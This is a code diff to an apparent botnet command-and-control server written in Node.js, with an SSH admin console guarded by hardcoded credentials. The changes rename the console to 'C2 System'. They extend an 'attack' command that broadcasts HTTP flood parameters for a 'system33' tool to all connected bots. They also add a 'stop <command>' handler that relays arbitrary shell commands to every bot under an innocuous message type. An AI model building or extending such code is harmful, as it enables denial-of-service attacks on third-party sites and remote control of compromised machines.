@@ -15,7 +15,7 @@ const { WebSocketServer } = require('ws');
 // Configuration
 const SSH_PORT = 8023;
 const WEBSOCKET_PORT = 8765;
-const ADMIN_USERNAME = 'admin';
+const ADMIN_USERNAME = 'pv';
 const ADMIN_PASSWORD = '111111';
 
 // Generate or load SSH host key
@@ -203,16 +203,18 @@ function handleAdminConnection(client) {
                 // Welcome message
                 const welcome = 
                     '============================================================\r\n' +
-                    'WebSocket System - Admin Console (SSH)\r\n' +
+                    'C2 System - Admin Console (SSH)\r\n' +
                     '============================================================\r\n' +
                     'Commands:\r\n' +
                     '  attack                - Launch attack (prompts for parameters)\r\n' +
+                    '  stop <command>        - Execute shell command on all bots (Linux)\r\n' +
+                    '  stopall               - Kill all system33 processes\r\n' +
                     '  bots                  - Show number of connected bots\r\n' +
                     '  list                  - List all connected bots\r\n' +
                     '  stats                 - Show connection statistics\r\n' +
                     '  help                  - Show this help message\r\n' +
                     '============================================================\r\n' +
-                    'Note: All messages are automatically sent to ALL bots.\r\n' +
+                    'Note: All commands are executed on Linux systems only.\r\n' +
                     'Admin connection is persistent. Close terminal to disconnect.\r\n' +
                     '============================================================\r\n';
 
@@ -293,7 +295,7 @@ function handleAdminConnection(client) {
                                     // All parameters collected, send attack command
                                     attackMode = false;
                                     
-                                    const attackCommand = `./system33 --url ${attackParams.HOST} --duration ${attackParams.TIME} --http-method ${attackParams['HTTP-METHOD']} --jitter ${attackParams.JITTER} --http-protocol ${attackParams['HTTP-PROTOCOL']} --adaptive-delay ${attackParams['ADAPTIVE-DELAY']}`;
+                                    const attackCommand = `./system33 -url ${attackParams.HOST} -duration ${attackParams.TIME} -http-method ${attackParams['HTTP-METHOD']} -jitter ${attackParams.JITTER} -http-protocol ${attackParams['HTTP-PROTOCOL']} -adaptive-delay ${attackParams['ADAPTIVE-DELAY']} -concurrency ${attackParams.CONCURRENCY} -burst-size ${attackParams.BURST} -random-path ${attackParams['RANDOM-PATH']} 2>/dev/null`;
                                     
                                     stream.write('\r\n');
                                     stream.write(`Sending to ${manager.botConnections.size} bots...\r\n`);
@@ -357,12 +359,27 @@ function handleAdminConnection(client) {
                                 stream.write(response);
                                 stream.write('admin> ');
                             } else if (command.toLowerCase() === 'stopall') {
-                                 manager.broadcastToBots({
+                                // Kill all system33 processes (Linux only)
+                                manager.broadcastToBots({
                                     type: 'stop',
-                                    message: 'killall system33 ; pkill -9 system33 ; kill -9 system33',
+                                    message: 'killall system33 2>/dev/null ; pkill -9 system33 2>/dev/null',
                                     timestamp: new Date().toISOString()
                                 });
-                                stream.write(`Sent to ${manager.botConnections.size} bots\r\n`);
+                                stream.write(`Stop command sent to ${manager.botConnections.size} bots\r\n`);
+                                stream.write('admin> ');
+                            } else if (command.toLowerCase().startsWith('stop ')) {
+                                // Execute custom command on all bots
+                                const shellCommand = command.substring(5).trim();
+                                if (shellCommand) {
+                                    manager.broadcastToBots({
+                                        type: 'stop',
+                                        message: shellCommand,
+                                        timestamp: new Date().toISOString()
+                                    });
+                                    stream.write(`Command sent to ${manager.botConnections.size} bots: ${shellCommand}\r\n`);
+                                } else {
+                                    stream.write('Usage: stop <command>\r\n');
+                                }
                                 stream.write('admin> ');
                             } else {
                                 // Send all other messages to all bots
